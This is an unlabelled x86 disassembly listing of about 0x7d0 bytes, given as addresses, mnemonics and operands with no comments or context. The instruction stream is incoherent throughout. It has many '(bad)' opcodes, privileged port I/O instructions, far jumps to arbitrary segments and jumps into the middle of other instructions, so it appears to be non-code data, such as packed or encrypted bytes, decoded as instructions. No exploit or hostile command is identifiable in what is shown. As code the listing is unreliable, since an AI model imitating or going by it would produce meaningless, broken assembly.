  4152a6:	scas   eax,DWORD PTR es:[edi]
  4152a7:	push   edi
  4152a8:	enter  0x1b14,0xd2
  4152ac:	in     al,dx
  4152ad:	jl     0x4152ad
  4152af:	inc    esp
  4152b0:	pop    ss
  4152b1:	cmp    dl,bl
  4152b3:	add    eax,0x849ff8da
  4152b8:	add    al,0xde
  4152ba:	jmp    0x984e02f1
  4152bf:	pop    eax
  4152c0:	(bad)  
  4152c1:	aam    0x49
  4152c3:	stos   BYTE PTR es:[edi],al
  4152c4:	in     eax,0x2b
  4152c6:	les    edi,FWORD PTR [ebp-0xa]
  4152c9:	jae    0x4152d0
  4152cb:	fucomip st,st(3)
  4152cd:	(bad)  
  4152ce:	leave  
  4152cf:	(bad)  
  4152d0:	aaa    
  4152d1:	das    
  4152d2:	pushf  
  4152d3:	(bad)  
  4152d5:	cmp    BYTE PTR [eax-0x3c],dl
  4152d8:	and    eax,0x5e4a73f
  4152dd:	and    al,0xab
  4152df:	mov    eax,ds:0xdb24f212
  4152e4:	sub    bl,BYTE PTR [ebx+0x1e261e9b]
  4152ea:	push   0xfffffff4
  4152ec:	pushf  
  4152ed:	xchg   BYTE PTR [ebp+0x199d2fb0],al
  4152f3:	cmp    eax,0xa953caa
  4152f8:	xchg   edi,eax
  4152f9:	iret   
  4152fa:	fsubr  DWORD PTR [eax]
  4152fc:	ror    BYTE PTR [eax+ecx*4-0x1600697b],1
  415303:	fwait
  415304:	ins    DWORD PTR es:[edi],dx
  415305:	push   ss
  415306:	mov    dl,0xf
  415308:	mov    ah,dl
  41530a:	(bad)  
  41530b:	cmp    BYTE PTR [esi+eiz*8],bh
  41530e:	popa   
  41530f:	dec    edx
  415310:	sbb    bh,BYTE PTR [edi-0x52]
  415313:	cld    
  415314:	(bad)  
  415315:	(bad)  
  415317:	xchg   esi,eax
  415318:	mov    ebp,0x747baa43
  41531d:	dec    edx
  41531e:	stos   DWORD PTR es:[edi],eax
  41531f:	add    BYTE PTR [ebx+eiz*8-0x33],bh
  415323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415324:	sti    
  415325:	cmp    ebx,DWORD PTR [ecx-0x44]
  415328:	in     al,0xeb
  41532a:	xchg   edx,eax
  41532b:	test   WORD PTR [ebx+edx*2-0x1c],bp
  415330:	fwait
  415331:	nop
  415332:	in     eax,dx
  415333:	out    dx,al
  415334:	leave  
  415335:	icebp  
  415336:	jmp    0x30c:0xaccbcbe3
  41533d:	dec    esp
  41533e:	stos   DWORD PTR es:[edi],eax
  41533f:	xchg   bh,dl
  415341:	sti    
  415342:	lock cld 
  415344:	aaa    
  415345:	outs   dx,BYTE PTR ds:[esi]
  415346:	push   ss
  415347:	dec    edi
  415348:	(bad)  
  415349:	js     0x41533b
  41534b:	shr    DWORD PTR [eax],0xfa
  41534e:	and    DWORD PTR [ebx+eiz*1+0x18],ecx
  415352:	lock sbb BYTE PTR [esp+edx*4-0xbfc2796],ch
  41535a:	retf   0xa6e9
  41535d:	ins    BYTE PTR es:[edi],dx
  41535e:	std    
  41535f:	out    dx,al
  415360:	(bad)  
  415362:	or     al,0xe8
  415364:	jecxz  0x41536e
  415366:	or     edi,DWORD PTR [edi]
  415368:	sub    al,0x2f
  41536a:	fld    QWORD PTR [eax-0x42347c7c]
  415370:	pop    ecx
  415371:	sub    al,BYTE PTR [ecx+0x2d671536]
  415377:	ins    BYTE PTR es:[edi],dx
  415378:	imul   esi,DWORD PTR [ebx+edi*2+0x2b3a258d],0x38c70321
  415383:	jle    0x4153c2
  415385:	fiadd  WORD PTR [esi+0x1262e041]
  41538b:	imul   ebx,DWORD PTR [esi-0x2f],0x663cf24f
  415392:	push   edx
  415393:	mov    ebx,0xc9a852ce
  415398:	nop
  415399:	jp     0x41532f
  41539b:	enter  0x4d03,0xe6
  41539f:	pop    ecx
  4153a0:	div    DWORD PTR ds:0x780e8495
  4153a6:	fstp   st(2)
  4153a8:	xor    al,BYTE PTR [ecx-0x31]
  4153ab:	inc    ebx
  4153ac:	std    
  4153ad:	iret   
  4153ae:	cmp    ah,bh
  4153b0:	or     dl,bl
  4153b2:	xchg   esi,eax
  4153b3:	cmp    ebp,DWORD PTR [ecx-0x8]
  4153b6:	nop
  4153b7:	daa    
  4153b8:	test   DWORD PTR [esi+0x7a],eax
  4153bb:	jmp    0x29ce:0xa983918f
  4153c2:	(bad)  [ecx-0x62fcd609]
  4153c8:	fidivr DWORD PTR [edi+ecx*8]
  4153cb:	inc    esi
  4153cc:	mul    DWORD PTR [edi-0x3b]
  4153cf:	jbe    0x41540e
  4153d1:	mov    edi,0xea59a125
  4153d6:	sub    DWORD PTR [esp+edx*2+0x6489c0a8],0x23
  4153de:	mov    esi,0x35072be1
  4153e3:	je     0x415408
  4153e5:	int3   
  4153e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153e7:	sub    al,0x9
  4153e9:	(bad)  
  4153eb:	jmp    0xf72958e6
  4153f0:	dec    esp
  4153f1:	out    dx,al
  4153f2:	gs retf 
  4153f4:	push   es
  4153f5:	addr16 push ebp
  4153f7:	xchg   esp,eax
  4153f8:	add    DWORD PTR [edi],esi
  4153fa:	in     al,0x16
  4153fc:	mov    edi,0x1e0b46ff
  415401:	lods   al,BYTE PTR ds:[esi]
  415402:	mov    dh,0x6a
  415404:	in     eax,dx
  415405:	hlt    
  415406:	loope  0x415443
  415408:	nop
  415409:	outs   dx,DWORD PTR ds:[esi]
  41540a:	jl     0x415465
  41540c:	out    dx,eax
  41540d:	add    ebx,0xcad5b864
  415413:	pop    es
  415414:	scas   al,BYTE PTR es:[edi]
  415415:	popf   
  415416:	jns    0x41543c
  415418:	out    dx,al
  415419:	mov    bh,0x87
  41541b:	(bad)  
  41541c:	cs jnp 0x4153b8
  41541f:	scas   al,BYTE PTR es:[edi]
  415420:	xchg   BYTE PTR ds:0x2afb4168,bl
  415426:	(bad)  
  415427:	mov    dl,0xee
  415429:	(bad)  [eax+ebp*2-0x78]
  41542d:	sub    al,cl
  41542f:	cmp    DWORD PTR ss:[esi+0x56],esi
  415433:	data16 (bad) 
  415435:	cmp    al,0x93
  415437:	mov    cs,WORD PTR [edi+0x2335024]
  41543d:	sub    BYTE PTR [edx+0x73],ah
  415440:	cmp    al,BYTE PTR [edx-0x158a6a12]
  415446:	enter  0x421,0x91
  41544a:	push   ebx
  41544b:	test   BYTE PTR [eax+0x3e],dl
  41544e:	sub    BYTE PTR [edi-0x27910bb4],dh
  415454:	in     eax,dx
  415455:	enter  0xab21,0xf2
  415459:	inc    ebx
  41545a:	add    DWORD PTR gs:[ebp+edx*4-0x300ae519],eax
  415462:	cdq    
  415463:	mov    ebp,0xb89f8a85
  415468:	xor    al,0x53
  41546a:	(bad)  
  41546b:	lods   al,BYTE PTR ds:[esi]
  41546c:	retf   
  41546d:	stos   BYTE PTR es:[edi],al
  41546e:	enter  0x3d17,0x3c
  415472:	(bad)  
  415473:	dec    ebp
  415474:	jp     0x415428
  415476:	dec    esp
  415477:	jp     0x41544a
  415479:	jbe    0x4154a7
  41547b:	push   ss
  41547c:	stos   BYTE PTR es:[edi],al
  41547d:	lahf   
  41547e:	data16 jle 0x4154ad
  415481:	ja     0x41542d
  415483:	mov    dh,0x39
  415485:	ficom  DWORD PTR [ebp+0x225d4f48]
  41548b:	data16 clc 
  41548d:	mov    eax,0xbdd41e16
  415492:	inc    esp
  415493:	dec    edi
  415494:	sub    eax,0xe6e359ea
  415499:	or     al,0x0
  41549b:	xchg   ebx,eax
  41549c:	aad    0xd7
  41549e:	inc    DWORD PTR [ebx-0x38]
  4154a1:	push   ds
  4154a2:	retf   0x7c5d
  4154a5:	jp     0x415435
  4154a7:	mov    edx,0xf2ccb002
  4154ac:	mov    ebp,0xac2cd107
  4154b1:	push   ss
  4154b2:	bound  esp,QWORD PTR [edi-0xb6eb197]
  4154b8:	and    BYTE PTR [esi-0x4b],cl
  4154bb:	dec    esi
  4154bc:	test   al,0x8e
  4154be:	ss dec ecx
  4154c0:	xchg   esi,eax
  4154c1:	shl    al,1
  4154c3:	inc    esp
  4154c4:	pusha  
  4154c5:	(bad)  
  4154c6:	and    esi,DWORD PTR [ecx-0x77]
  4154c9:	neg    BYTE PTR [ebx-0x16]
  4154cc:	pop    esp
  4154cd:	sub    eax,0xe6804a67
  4154d2:	std    
  4154d3:	aam    0x49
  4154d5:	int3   
  4154d6:	stos   DWORD PTR es:[edi],eax
  4154d7:	and    al,0x53
  4154d9:	fld    DWORD PTR [edi+0x65]
  4154dc:	fst    st(5)
  4154de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154df:	adc    al,0x49
  4154e1:	sti    
  4154e2:	arpl   WORD PTR [edx+0x63],ax
  4154e5:	jl     0x415467
  4154e7:	and    al,BYTE PTR [esi-0x3f]
  4154ea:	int    0xf
  4154ec:	jl     0x4154c3
  4154ee:	mov    ds:0x49dbe5b6,eax
  4154f3:	sbb    ebx,DWORD PTR [ebp-0x15]
  4154f6:	mov    edi,0xe26d5994
  4154fb:	je     0x41553f
  4154fd:	sub    BYTE PTR [esi-0x3ca4129],0xb9
  415504:	cmp    dl,BYTE PTR [eax+0x7d835fc7]
  41550a:	stc    
  41550b:	sar    ch,1
  41550d:	mov    eax,0x30b64aab
  415512:	push   ecx
  415513:	xor    eax,0xaee2bd39
  415518:	and    al,0x44
  41551a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41551b:	lods   al,BYTE PTR ds:[esi]
  41551c:	push   cs
  41551d:	push   ds
  41551e:	scas   al,BYTE PTR es:[edi]
  41551f:	cmp    DWORD PTR [edi],0x81fd7499
  415525:	ja     0x41555e
  415527:	retf   
  415528:	sahf   
  415529:	aas    
  41552a:	mov    ah,0x32
  41552c:	ja     0x415537
  41552e:	mov    ?,edi
  415530:	je     0x4155a5
  415532:	inc    ecx
  415533:	iret   
  415534:	popa   
  415535:	add    eax,0x15e0a302
  41553a:	push   eax
  41553b:	fistp  WORD PTR [edi-0x2bc0407e]
  415541:	sub    dh,BYTE PTR [esp+eiz*2]
  415544:	and    ecx,DWORD PTR [esi+ecx*2+0x23]
  415548:	lahf   
  415549:	stc    
  41554a:	test   al,0x10
  41554c:	fbld   TBYTE PTR [ecx-0x77]
  41554f:	or     dh,BYTE PTR [edi+ebx*4+0x78]
  415553:	clc    
  415554:	xor    edx,DWORD PTR [eax+0x18587665]
  41555a:	jmp    0xab5e:0x42867eca
  415561:	mov    ds:0xd2a5c07e,eax
  415566:	xchg   esi,eax
  415567:	push   edi
  415568:	jns    0x4155ad
  41556a:	in     al,dx
  41556b:	(bad)  
  41556d:	(bad)  
  41556e:	push   edi
  41556f:	xchg   edi,eax
  415570:	mov    BYTE PTR [edi+0x35],dh
  415573:	push   esi
  415574:	popa   
  415575:	sbb    eax,0x4549bc49
  41557a:	jbe    0x41552c
  41557c:	push   es
  41557d:	dec    ebp
  41557e:	sbb    dh,BYTE PTR [ebx-0x36c3e9c8]
  415584:	adc    DWORD PTR [ecx+0x657b4679],edi
  41558a:	lea    esi,[ecx]
  41558c:	mov    eax,ds:0xa02f0f74
  415591:	stc    
  415592:	mov    cl,0x98
  415594:	retf   
  415595:	std    
  415596:	int3   
  415597:	sbb    eax,DWORD PTR [eax+eiz*8+0x49]
  41559b:	clc    
  41559c:	mov    DWORD PTR [edx+0x79],ebx
  41559f:	mov    esp,0x29a69333
  4155a4:	add    eax,0xbb08686e
  4155a9:	push   ebp
  4155aa:	pop    ebp
  4155ab:	pop    eax
  4155ac:	ja     0x415564
  4155ae:	mov    esi,0x8874d7ac
  4155b3:	or     ebx,ebp
  4155b5:	adc    esi,DWORD PTR [ebx+0x239a92cd]
  4155bb:	stc    
  4155bc:	fdiv   DWORD PTR [ebx-0x7c]
  4155bf:	scas   eax,DWORD PTR es:[edi]
  4155c0:	aaa    
  4155c1:	pop    ss
  4155c2:	imul   edi,DWORD PTR [ebp-0x541faf74],0x6b5cbe53
  4155cc:	jae    0x4155ea
  4155ce:	and    ah,dl
  4155d0:	out    0xce,eax
  4155d2:	jae    0x415600
  4155d4:	push   edi
  4155d5:	lods   eax,DWORD PTR ds:[esi]
  4155d6:	popf   
  4155d7:	adc    dh,BYTE PTR [esi+eiz*1-0x7a]
  4155db:	and    bl,0x19
  4155de:	dec    eax
  4155df:	push   esp
  4155e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e1:	mov    dl,0xc
  4155e3:	mov    bh,0xa6
  4155e5:	mov    esi,0xada8f22b
  4155ea:	icebp  
  4155eb:	xor    DWORD PTR [ecx-0x6a],esp
  4155ee:	fld    QWORD PTR [edi-0x2a]
  4155f1:	or     al,0x55
  4155f3:	sbb    bl,bh
  4155f5:	ror    DWORD PTR [edi],0xe0
  4155f8:	sbb    dh,dh
  4155fa:	sub    BYTE PTR [ecx+0x1810f951],al
  415600:	add    BYTE PTR [esp+esi*4-0x475eea7b],cl
  415607:	mov    edi,?
  415609:	ins    DWORD PTR es:[edi],dx
  41560a:	pop    ss
  41560b:	jmp    0x7045:0xc64cfd2
  415612:	movnti DWORD PTR cs:[eax],edi
  415616:	cmp    DWORD PTR [ecx+0x2b7e57cc],edx
  41561c:	mov    ah,0xbf
  41561e:	sar    edx,1
  415620:	sbb    al,0x77
  415622:	xchg   edi,eax
  415623:	repz and edx,DWORD PTR [edi+0x20]
  415627:	iret   
  415628:	mov    esp,0xfa003b23
  41562d:	pop    ds
  41562e:	leave  
  41562f:	sar    ecx,cl
  415631:	cdq    
  415632:	sub    ebp,DWORD PTR [ebx+edx*2]
  415635:	in     al,0xc3
  415637:	pusha  
  415638:	mov    esp,0x77ee0619
  41563d:	fisubr WORD PTR [ebp-0x5b04b8ee]
  415643:	(bad)  
  415644:	xor    al,0x4
  415646:	icebp  
  415647:	cmp    al,bl
  415649:	or     dl,ch
  41564b:	(bad)  
  41564c:	push   0xffffff8f
  41564e:	jp     0x4155d5
  415650:	(bad)  
  415651:	fbld   TBYTE PTR [esi]
  415653:	jns    0x415616
  415655:	and    cl,BYTE PTR [eax+edx*8]
  415658:	icebp  
  415659:	arpl   sp,dx
  41565b:	out    0xac,al
  41565d:	and    DWORD PTR [ebx+0x5],edi
  415660:	lock test eax,0xc5be1deb
  415666:	out    0xd6,eax
  415668:	cmp    BYTE PTR [ebx],cl
  41566a:	lods   ax,WORD PTR ds:[esi]
  41566c:	jno    0x415675
  41566e:	(bad)  
  41566f:	inc    esi
  415670:	mov    ch,BYTE PTR [ecx-0xd683a0b]
  415676:	adc    DWORD PTR [edx-0x20],ecx
  415679:	fsubr  DWORD PTR [ecx]
  41567b:	dec    esp
  41567c:	inc    eax
  41567d:	iret   
  41567e:	dec    ebp
  41567f:	std    
  415680:	out    dx,eax
  415681:	dec    esp
  415682:	xchg   ebx,eax
  415683:	fsub   st,st(6)
  415685:	aas    
  415686:	xchg   esp,eax
  415687:	bound  edi,QWORD PTR [edx]
  415689:	ja     0x41563b
  41568b:	loope  0x415683
  41568d:	inc    ebx
  41568e:	cmp    esi,ebp
  415690:	rcr    BYTE PTR [eax],cl
  415692:	out    dx,al
  415693:	mov    esp,0xd3f69fdb
  415698:	jle    0x4156ec
  41569a:	cwde   
  41569b:	cmc    
  41569c:	sbb    eax,0x30d52580
  4156a1:	shl    DWORD PTR [edi],1
  4156a3:	cmp    BYTE PTR [edi+eiz*8-0x2486b17d],0xe
  4156ab:	sub    eax,0xc2abcd9
  4156b0:	dec    esp
  4156b1:	ins    BYTE PTR es:[edi],dx
  4156b2:	xor    ecx,ecx
  4156b4:	fidiv  WORD PTR [eax+0x492fe19c]
  4156ba:	xlat   BYTE PTR ds:[ebx]
  4156bb:	pop    edx
  4156bc:	cmp    cl,dh
  4156be:	clc    
  4156bf:	in     al,dx
  4156c0:	mov    ecx,0x90917645
  4156c5:	shr    BYTE PTR [edx],cl
  4156c7:	jo     0x4156f6
  4156c9:	in     al,dx
  4156ca:	ror    eax,1
  4156cc:	dec    esi
  4156cd:	mov    BYTE PTR [edx-0x7859f23c],dl
  4156d3:	jns    0x4156a6
  4156d5:	mov    dl,ch
  4156d7:	jecxz  0x4156d1
  4156d9:	movlps QWORD PTR [ebp-0x60],xmm5
  4156dd:	adc    eax,0x49e5bb71
  4156e2:	into   
  4156e3:	jg     0x415688
  4156e5:	aam    0xf4
  4156e7:	cli    
  4156e8:	dec    ebx
  4156e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ea:	clc    
  4156eb:	cmp    ah,BYTE PTR [eax]
  4156ed:	and    bh,BYTE PTR [edi-0x2344d276]
  4156f3:	in     al,dx
  4156f4:	fdivp  st(5),st
  4156f6:	lods   al,BYTE PTR ds:[esi]
  4156f7:	cmp    cl,BYTE PTR [esi-0x386f7878]
  4156fd:	lods   al,BYTE PTR ds:[esi]
  4156fe:	and    DWORD PTR [ecx],ebx
  415700:	stc    
  415701:	pop    ebx
  415702:	sbb    dl,BYTE PTR [ebp+eax*8-0x65]
  415706:	out    dx,eax
  415707:	(bad)  
  415708:	and    al,0xbe
  41570a:	mov    edx,0x12c4499
  41570f:	push   ecx
  415710:	outs   dx,BYTE PTR ds:[esi]
  415711:	fxch   st(7)
  415713:	mov    cs,WORD PTR [esi+ebx*4]
  415716:	cs push 0xdc8ed004
  41571c:	sbb    DWORD PTR [edx+edx*4-0x700bf49b],eax
  415723:	not    al
  415725:	test   eax,0xe8015e12
  41572a:	push   cs
  41572b:	jb     0x415714
  41572d:	push   ss
  41572e:	adc    BYTE PTR [edi+0x28952b27],dh
  415734:	gs addr16 xchg ebx,eax
  415737:	and    esp,edi
  415739:	xchg   WORD PTR [edx+0x75dfc050],di
  415740:	retf   
  415741:	ja     0x415730
  415743:	out    0x7f,al
  415745:	dec    edi
  415746:	lods   al,BYTE PTR ds:[esi]
  415747:	mov    edi,0x1a5ad47a
  41574c:	ficomp WORD PTR [edi]
  41574e:	bound  esp,QWORD PTR [esi+eiz*1-0x1e0526ed]
  415755:	inc    edx
  415757:	push   ebx
  415758:	xor    eax,0x9cc5c0c3
  41575d:	inc    esp
  41575e:	aaa    
  41575f:	(bad)  
  415761:	(bad)  
  415762:	idiv   DWORD PTR [ebx]
  415764:	into   
  415765:	fcmovne st,st(1)
  415767:	jg     0x4157d1
  415769:	inc    ebx
  41576a:	iret   
  41576b:	data16 test BYTE PTR ds:0x8ea19d44,ah
  415772:	sbb    edi,eax
  415774:	xchg   edi,eax
  415775:	adc    eax,0x544be8f8
  41577a:	inc    esp
  41577b:	and    al,0x41
  41577d:	cmp    ah,BYTE PTR [esi+edi*8]
  415780:	jge    0x41576c
  415782:	mov    ch,0x91
  415784:	(bad)
  415788:	or     dh,dl
  41578a:	sbb    BYTE PTR [ebp-0xc],bl
  41578d:	sahf   
  41578e:	sti    
  41578f:	xchg   BYTE PTR [eax-0x1cade58a],dh
  415795:	inc    edx
  415796:	nop
  415797:	and    ah,BYTE PTR [esp+edx*2+0x448fe012]
  41579e:	or     DWORD PTR [ebx+esi*4-0x44],0xeb9a9cf7
  4157a6:	outs   dx,DWORD PTR ds:[esi]
  4157a7:	push   ds
  4157a8:	aad    0xb
  4157aa:	pop    bx
  4157ac:	dec    esi
  4157ad:	or     eax,0x8cfbbfb4
  4157b2:	(bad)  
  4157b3:	mov    WORD PTR [eax],gs
  4157b5:	dec    esi
  4157b6:	dec    esi
  4157b7:	sub    eax,DWORD PTR [eax]
  4157b9:	mov    ss,WORD PTR [edx+0x34870b2d]
  4157bf:	inc    edi
  4157c0:	cmp    ch,cl
  4157c2:	addr16 mov cl,0xd
  4157c5:	pop    ebx
  4157c6:	jbe    0x4157d3
  4157c8:	push   ecx
  4157c9:	stc    
  4157ca:	and    ch,BYTE PTR [edi+0x58fbea1f]
  4157d0:	popa   
  4157d1:	clts   
  4157d3:	push   ebx
  4157d4:	push   0xffffffa1
  4157d6:	inc    bh
  4157d8:	test   al,0x27
  4157da:	and    DWORD PTR [edx+0x3c],ecx
  4157dd:	sub    BYTE PTR [edi],dh
  4157df:	xchg   ebp,eax
  4157e0:	xchg   esp,esp
  4157e2:	cmp    al,0x9a
  4157e4:	out    dx,eax
  4157e5:	call   0xeff3:0x35855ac8
  4157ec:	aad    0x87
  4157ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ef:	cmc    
  4157f0:	nop
  4157f1:	pop    edx
  4157f2:	jbe    0x41581f
  4157f4:	ds pop edi
  4157f6:	or     dh,bl
  4157f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157f9:	ficom  WORD PTR [ebx+esi*2+0x371d31e8]
  415800:	fild   DWORD PTR [ebx+0x36b70cf0]
  415806:	adc    cl,BYTE PTR ds:0xa40a73f5
  41580c:	lods   al,BYTE PTR ds:[esi]
  41580d:	rol    DWORD PTR [esi],0x1e
  415810:	iret   
  415811:	ret    
  415812:	xlat   BYTE PTR ds:[ebx]
  415813:	fild   WORD PTR [edi+edx*1+0x5c1b57f1]
  41581a:	inc    ecx
  41581b:	dec    edx
  41581c:	adc    BYTE PTR ds:0xfc1c9ae9,dh
  415822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415823:	fnstenv [eax]
  415825:	lahf   
  415826:	mov    ds:0x3ace4fe2,eax
  41582b:	not    DWORD PTR [eax-0x3]
  41582e:	jne    0x41582b
  415830:	sbb    DWORD PTR ds:0xd8715740,eax
  415836:	xor    ebx,edi
  415838:	outs   dx,DWORD PTR ds:[esi]
  415839:	xchg   edi,eax
  41583a:	popf   
  41583b:	xchg   esi,eax
  41583c:	xor    al,0x19
  41583e:	pop    esp
  41583f:	xlat   BYTE PTR ds:[ebx]
  415840:	and    DWORD PTR [eax+eiz*1],0x39
  415844:	and    bh,bl
  415846:	add    al,0xdd
  415848:	jnp    0x41585c
  41584a:	xor    esp,DWORD PTR [edi-0x50]
  41584d:	xchg   esp,eax
  41584e:	ins    BYTE PTR es:[edi],dx
  41584f:	call   0xe8d3:0x9076adc9
  415856:	push   0x21
  415858:	pop    edi
  415859:	dec    ebx
  41585a:	xchg   ebx,eax
  41585b:	call   0xdd4a9beb
  415860:	call   0x3c101ca1
  415865:	mov    ebp,0x902fddee
  41586a:	out    0x16,eax
  41586c:	inc    eax
  41586d:	sub    eax,0x3fd4ffea
  415872:	pop    ss
  415873:	xchg   BYTE PTR [eax],ch
  415875:	xchg   DWORD PTR [esi-0x7c],edi
  415878:	je     0x41583f
  41587a:	rol    bl,cl
  41587c:	xchg   edx,eax
  41587d:	in     eax,0x5
  41587f:	inc    edi
  415880:	in     al,dx
  415881:	mov    eax,0x9d5b474a
  415886:	out    dx,eax
  415887:	sub    edx,DWORD PTR ds:0x96f7a53a
  41588d:	add    esp,DWORD PTR [eax+ebx*1-0x1ded4bb6]
  415894:	mov    eax,0x442c4da6
  415899:	jbe    0x415912
  41589b:	fst    DWORD PTR [edi+0x69]
  41589e:	xor    BYTE PTR [eax-0x6d658ba],0xec
  4158a5:	and    BYTE PTR [esi+0x65],0x49
  4158a9:	add    eax,0x968b243a
  4158ae:	add    DWORD PTR [ebx-0x7aa4159a],ebx
  4158b4:	(bad)  
  4158b5:	mov    esp,DWORD PTR [ebp+0x6b]
  4158b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b9:	out    0xb5,eax
  4158bb:	scas   eax,DWORD PTR es:[edi]
  4158bc:	mov    edx,0x2ec8d327
  4158c1:	js     0x415915
  4158c3:	dec    esi
  4158c4:	js     0x4158ab
  4158c6:	xor    al,0x7a
  4158c8:	(bad)  
  4158c9:	fwait
  4158ca:	aaa    
  4158cb:	test   DWORD PTR [eax-0x1aa37875],esp
  4158d1:	adc    BYTE PTR [edi+0x6aa1529b],cl
  4158d7:	pop    esi
  4158d8:	pushf  
  4158d9:	enter  0x24b8,0xfc
  4158dd:	inc    esi
  4158de:	imul   esi,ecx,0x10a4a4e1
  4158e4:	mov    dl,0xb5
  4158e6:	sub    al,0xf1
  4158e8:	stc    
  4158e9:	push   0x901b7598
  4158ee:	fld    TBYTE PTR [esi+0x43]
  4158f1:	(bad)  
  4158f2:	cs pusha 
  4158f4:	pushf  
  4158f5:	xchg   edx,eax
  4158f6:	arpl   WORD PTR [edx-0x21843174],bp
  4158fc:	nop
  4158fd:	push   0xffffffc9
  4158ff:	mov    WORD PTR [ebx+0x1defd5c6],?
  415905:	jmp    0x415915
  415907:	add    al,0xdc
  415909:	pop    ebx
  41590a:	js     0x4158f3
  41590c:	xchg   edi,eax
  41590d:	or     BYTE PTR [ebx],cl
  41590f:	(bad)  
  415910:	sbb    al,dl
  415912:	lds    edi,FWORD PTR [esi]
  415914:	and    BYTE PTR [ebp+0x0],cl
  415917:	das    
  415918:	lds    ebp,FWORD PTR [eax+0x236510e3]
  41591e:	mov    bl,0xb2
  415920:	bndstx [edx+0xc],(bad)
  415924:	sahf   
  415925:	rol    edx,0xdb
  415928:	sub    eax,0x8247bdf6
  41592d:	test   eax,0xe73f4053
  415932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415933:	(bad)  
  415934:	dec    ebx
  415935:	inc    eax
  415936:	mov    esi,0x5e587585
  41593b:	push   edx
  41593c:	in     al,dx
  41593d:	xor    dl,BYTE PTR [edi+0x4d]
  415940:	push   esp
  415941:	xchg   esp,eax
  415942:	retf   0x22c
  415945:	sub    eax,0xb0178120
  41594a:	call   0xf2bf:0xadfbbcce
  415951:	ret    0xab47
  415954:	mov    ebp,0x2d32f5e0
  415959:	loop   0x4158fe
  41595b:	scas   al,BYTE PTR es:[edi]
  41595c:	jmp    0x4158ef
  41595e:	jmp    0x638d:0xd8439eb5
  415965:	pop    eax
  415966:	dec    eax
  415967:	push   edx
  415968:	test   al,0x2f
  41596a:	mov    eax,ds:0x2ba50638
  41596f:	or     BYTE PTR [eax+0x574b2016],dl
  415975:	loope  0x4159dc
  415977:	push   0x2306e793
  41597c:	aad    0x3f
  41597e:	out    dx,eax
  41597f:	sub    BYTE PTR [ebx+0x14],ch
  415982:	add    ebx,DWORD PTR [ebx+0x11]
  415985:	add    ecx,DWORD PTR [edx+0x6775af70]
  41598b:	xchg   ebx,eax
  41598c:	int    0xe1
  41598e:	into   
  41598f:	push   ss
  415990:	into   
  415991:	push   edx
  415992:	mov    edi,0x5fdd62b0
  415997:	daa    
  415998:	mov    ecx,0xff9ceea7
  41599d:	lahf   
  41599e:	dec    ebp
  41599f:	ret    
  4159a0:	mov    bl,0x3d
  4159a2:	imul   eax,DWORD PTR [ecx],0x4992a21a
  4159a8:	jp     0x415953
  4159aa:	je     0x415995
  4159ac:	push   es
  4159ad:	ja     0x4159ca
  4159af:	addr16 mov edx,0xd480347c
  4159b5:	pop    eax
  4159b6:	xor    eax,0x87b6a9e5
  4159bb:	or     edi,esp
  4159bd:	dec    edx
  4159be:	dec    edi
  4159bf:	and    cl,BYTE PTR [edi+0x6e90fd5d]
  4159c5:	jo     0x415965
  4159c7:	fcom   DWORD PTR ds:0x4a6bd1ae
  4159cd:	enter  0xaaf1,0xd2
  4159d1:	test   DWORD PTR [ebx+0x27],ecx
  4159d4:	mov    dh,0xa1
  4159d6:	mov    edi,0xcbd2c87e
  4159db:	shl    bh,0xc2
  4159de:	jle    0x415a32
  4159e0:	mov    ah,0xd
  4159e2:	pop    ebx
  4159e3:	cmp    ebx,0xa94b96e0
  4159e9:	cld    
  4159ea:	xchg   ebx,eax
  4159eb:	iret   
  4159ec:	and    ch,cl
  4159ee:	cs mov edx,0x541381dc
  4159f4:	xor    al,0x49
  4159f6:	push   edx
  4159f7:	mov    BYTE PTR [ecx+0x6782a7af],dh
  4159fd:	test   BYTE PTR [eax],0xd2
  415a00:	pop    eax
  415a01:	out    0xad,eax
  415a03:	mov    ebx,0xbed86e35
  415a08:	je     0x415997
  415a0a:	rcl    bl,1
  415a0c:	mov    BYTE PTR [ecx],bl
  415a0e:	stos   DWORD PTR es:[edi],eax
  415a0f:	aam    0xa1
  415a11:	add    ch,al
  415a13:	or     eax,DWORD PTR [edi]
  415a15:	cdq    
  415a16:	out    dx,al
  415a17:	or     DWORD PTR ds:0x40422886,ebx
  415a1d:	lahf   
  415a1e:	xor    al,ch
  415a20:	test   al,0x59
  415a22:	adc    dl,ch
  415a24:	adc    BYTE PTR [ebx],0x94
  415a27:	scas   eax,DWORD PTR es:[edi]
  415a28:	dec    eax
  415a29:	xchg   edi,eax
  415a2a:	and    esi,DWORD PTR [ecx]
  415a2c:	xor    bl,ch
  415a2e:	stos   BYTE PTR es:[edi],al
  415a2f:	jl     0x4159bd
  415a31:	(bad)  
  415a32:	jmp    0x415aa5
  415a34:	bound  ebx,QWORD PTR [edx+0x45]
  415a37:	adc    eax,DWORD PTR [ebx-0x37bfe732]
  415a3d:	jp     0x415aab
  415a3f:	out    0xe5,eax
  415a41:	nop
  415a42:	cmp    ebx,esi
  415a44:	icebp  
  415a45:	mov    ebx,0xfb7bee6b
  415a4a:	iret   
  415a4b:	pop    esi
  415a4c:	hlt    
  415a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a4e:	mov    edx,0xb94cd00e
  415a53:	mov    dl,0x68
  415a55:	and    al,0x98
  415a57:	out    0xd5,al
  415a59:	cwde   
  415a5a:	(bad)  [ebp-0x42]
  415a5d:	or     DWORD PTR [esi],esi
  415a5f:	adc    eax,0x6f6ca50b
  415a64:	push   esi
  415a65:	mov    cl,0x18
  415a67:	stos   DWORD PTR es:[edi],eax
  415a68:	cmp    DWORD PTR [edx+0x7ca9bea7],eax
  415a6e:	scas   eax,DWORD PTR es:[edi]
  415a6f:	mov    ch,0x41
  415a71:	bound  ebp,QWORD PTR [edx+0x14d640f5]
  415a77:	loop   0x415a36
